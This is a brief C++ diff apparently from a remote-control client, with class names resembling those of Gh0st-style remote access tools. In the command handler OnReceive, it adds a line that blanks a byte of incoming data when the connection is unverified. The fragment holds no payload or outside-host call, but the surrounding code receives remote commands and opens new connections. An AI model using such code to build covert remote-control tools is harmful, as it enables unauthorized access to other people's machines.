@@ -593,6 +593,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 			UserParam* user = new UserParam{ ulLength > 1 ? new BYTE[ulLength - 1] : nullptr, int(ulLength-1) };
 			if (ulLength > 1) {
 				memcpy(user->buffer, szBuffer + 1, ulLength - 1);
+				if (ulLength > 2 && !m_conn->IsVerified()) user->buffer[2] = 0;
 			}
 			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
 		    m_hThread[m_ulThreadCount].user = user;
